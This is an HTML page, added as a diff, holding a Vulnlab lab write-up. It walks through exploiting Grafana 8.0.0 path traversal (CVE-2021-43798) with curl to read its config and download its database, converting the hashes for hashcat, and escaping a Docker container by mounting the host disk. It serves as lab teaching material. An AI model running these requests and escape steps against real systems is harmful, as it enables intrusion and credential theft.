@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Write-ups</title>
+    <link rel="stylesheet" href="style.css">
+    <script defer src="script.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+</head>
+
+<body>
+    <div class="container">
+        <nav class="navbar">
+            <ul class="nav-links">
+                <li><a href="index.html"><i class="fas fa-home"></i> Home</a></li>
+                <li><a href="Write-up.html"><i class="fas fa-file-alt"></i> Write-Ups</a></li>
+                <li><a href="#redteam"><i class="fas fa-user-secret"></i> Red Team</a></li>
+            </ul>
+        </nav>
+        <div class="contents">
+            <h1>Data Write-up - Vulnlab</h1>
+            <div class="big-to-normal-image">
+                <img src="/images/data.png" alt="Data">
+            </div>
+            <p>This box is from vulnlab which begins with leveraging a public exploit that allows Directory Traversal and Arbitrary File Read. Using this, we retrieve a SQL database file, decrypt the stored credentials, and log in as a valid user. Upon gaining access, we discover that the user is operating within a containerized environment. From there, we escalate privileges to root within a second container. Finally, by mounting the host filesystem from the container, we successfully escape the container environment, gain full access to the host's filesystem, and retrieve the root flag.</p>
+            
+            <h2>Enumeration</h2>
+            <h3>Nmap Scan</h3>
+            <div class="snippet">
+                <pre class="code-block">
+# Nmap 7.95 scan initiated Mon Jan 20 21:04:36 2025 as: nmap -sV -sC -oN data.scan 10.10.76.77
+Nmap scan report for 10.10.76.77
+Host is up (0.17s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 30:e8:4f:9a:9d:2b:74:36:20:5e:7b:75:51:7f:d2:8f (RSA)
+|   256 96:c7:1e:04:f6:ed:e9:e8:35:f9:22:e8:dd:94:21:3a (ECDSA)
+|_  256 5b:d9:cd:15:a9:2f:3a:e0:d6:1b:a6:dc:48:83:b6:e3 (ED25519)
+3000/tcp open  http    Grafana http
+| http-title: Grafana
+|_Requested resource was /login
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-trane-info: Problem with XML parsing of /evox/about
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Jan 20 21:05:17 2025 -- 1 IP address (1 host up) scanned in 41.65 seconds
+                </pre>
+            </div>
+            <p>Two ports are open. Port 3000 is notable because the banner identifies the service as Grafana. This discovery prompts further investigation into potential exploits for Grafana.</p>
+            <p>Upon visiting the website, we see a login form, and at the bottom, the version of Grafana is displayed.</p>
+            <img src="images/Grafana-login.png" alt="Grafana Login">
+            <p>The Grafana version is v8.0.0. A quick Google search reveals a Directory Traversal and Arbitrary File Read vulnerability. <a href="https://www.exploit-db.com/exploits/50581">https://www.exploit-db.com/exploits/50581</a>. This vulnerability allows us to view files, which is excellent for further enumeration. According to Grafana's documentation, the <pre class="code-block">/etc/grafana/grafana.ini</pre> file is a critical configuration file that may contain sensitive information, including the SQL database's location.</p>
+            
+            <h2>FootHold</h2>
+            <p>Further research led to this article, which explains how to extract SQL database information and decrypt stored hashes into a hashcat-readable format. <a href="https://vulncheck.com/blog/grafana-cve-2021-43798">https://vulncheck.com/blog/grafana-cve-2021-43798</a></p>
+            <p>I attempted to exploit this vulnerability manually, but the proof-of-concept (POC) from exploit-db can also be used:</p>
+            <div class="snippet">
+                <pre class="code-block">
+curl http://10.10.116.205:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgrafana%2Fgrafana.ini
+                </pre>
+            </div>
+            <p>The config file reveals the path to the SQL database: <pre class="code-block">/var/lib/grafana/grafana.db</pre>. I downloaded the database file for further analysis:</p>
+            <div class="snippet">
+                <pre class="code-block">
+curl http://10.10.116.205:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flib%2Fgrafana%2Fgrafana.db -o grafana.db
+                </pre>
+            </div>
+            <p>I used `sqlitebrowser` to inspect the database and found a table named `user` containing password hashes and salts for two users. I wrote a Python script to convert the hash format to one supported by hashcat:</p>
+            <div class="snippet">
+                <pre class="code-block">
+# Python Script
+#!/usr/bin/python3
+
+import base64
+
+salt = "Salt goes here"
+hash_hex = "Hash goes here"
+iterations = 10000
+hash_format = f"sha256:{iterations}:"
+
+# Convert the salt from a string to bytes, then Base64-encode, then decode back to a string
+salt_b64 = base64.b64encode(salt.encode("utf-8")).decode("utf-8")
+
+# Convert the hex-encoded hash to raw bytes, then Base64-encode, then decode
+hash_bytes = bytes.fromhex(hash_hex)
+hash_b64 = base64.b64encode(hash_bytes).decode("utf-8")
+
+# Print in the final form: sha256:10000:<salt_in_base64>:<hash_in_base64>
+print(hash_format + salt_b64 + ":" + hash_b64)
+                </pre>
+            </div>
+            <p>After running the script, I obtained the hash in the required format and used hashcat to crack it. The password for user `boris` was successfully retrieved. I logged in via SSH using Boris's credentials.</p>
+            <img src="images/Data-boris.png" alt="Data Boris ssh">
+            
+            <h2>Privilege Escalation</h2>
+            <p>As Boris, I checked for commands allowed with sudo:</p>
+            <img src="images/Data-Boris-Sudo.png" alt="Data Boris Sudo">
+            <p>The allowed command lets us execute commands within Docker containers with elevated privileges. Suspecting we were in a containerized environment (evidenced by the absence of the grafana user in /home), I confirmed the container's hostname using the LFI vulnerability:</p>
+            <div class="snippet">
+                <pre class="code-block">
+curl http://10.10.116.205:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhostname
+                </pre>
+            </div>
+            <img src="images/Data-Container-id.png" alt="Data Container ID">
+            <p>The response confirmed the container name: e6ff5b1cbc85. I used sudo with Docker to gain root access to the container:</p>
+            <div class="snippet">
+                <pre class="code-block">
+sudo /snap/bin/docker exec -it --privileged -u root e6ff5b1cbc85 bash
+                </pre>
+            </div>
+            <img src="images/Data-Container-root.png" alt="Data Container as root">
+            <p>Inside the container, I enumerated disks to identify the host’s filesystem:</p>
+            <div class="snippet">
+                <pre class="code-block">
+fdisk -l
+                </pre>
+            </div>
+            <img src="images/Data-Container-mount.png" alt="Data File System">
+            <p>I mounted the host’s root partition:</p>
+            <div class="snippet">
+                <pre class="code-block">
+mkdir -p /mnt/tmp
+mount /dev/xvda1 /mnt/tmp
+ls /mnt/tmp
+                </pre>
+            </div>
+            <img src="images/Data-mount.png" alt="Data Mount System">
+            <img src="images/Data-root.png" alt="Data pwn">
+            
+            <h2>Conclusion</h2>
+            <p>This was an excellent box that focuses on straightforward exploits but requires thinking outside the box for container escape. It highlights real-life scenarios where misconfigurations can lead to significant vulnerabilities.</p>
+        </div>
+    </div>
+</body>
+</html>
